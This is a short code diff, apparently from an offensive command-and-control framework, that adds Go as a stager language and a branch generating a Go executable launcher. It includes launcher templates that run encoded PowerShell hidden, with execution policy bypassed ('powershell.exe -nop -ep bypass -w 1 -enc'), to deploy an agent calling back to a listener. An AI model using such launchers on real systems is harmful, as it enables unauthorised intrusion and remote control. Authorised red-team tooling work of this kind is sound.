@@ -33,7 +33,7 @@ class Stager:
                 "Description": "Language of the stager to generate.",
                 "Required": True,
                 "Value": "powershell",
-                "SuggestedValues": ["powershell", "csharp", "ironpython"],
+                "SuggestedValues": ["powershell", "csharp", "ironpython", "go"],
                 "Strict": True,
             },
             "OutFile": {
@@ -67,12 +67,9 @@ class Stager:
             },
         }
 
-        # save off a copy of the mainMenu object to access external functionality
-        #   like listeners/agent handlers/etc.
         self.mainMenu = mainMenu
 
     def generate(self):
-        # Extract options
         options = self.options
         listener_name = options["Listener"]["Value"]
         obfuscate_command = options["ObfuscateCommand"]["Value"]
@@ -121,7 +118,7 @@ class Stager:
                 launcher_ps = enc_powershell(launcher_ps).decode("UTF-8")
                 launcher = f"powershell.exe -nop -ep bypass -w 1 -enc {launcher_ps}"
 
-            else:
+            elif language in ["csharp", "ironpython"]:
                 oneliner = self.mainMenu.stagergenv2.generate_exe_oneliner(
                     language=language,
                     obfuscate=obfuscate,
@@ -130,6 +127,14 @@ class Stager:
                     listener_name=listener_name,
                 )
                 launcher = f"powershell.exe -nop -ep bypass -w 1 -enc {oneliner.split('-enc ')[1]}"
+            elif language == "go":
+                launcher = self.mainMenu.stagergenv2.generate_go_exe_oneliner(
+                    language=language,
+                    obfuscate=obfuscate,
+                    obfuscation_command=obfuscate_command,
+                    encode=True,
+                    listener_name=listener_name,
+                )
 
         elif language == "powershell":
             launcher = self.mainMenu.stagergenv2.generate_launcher(
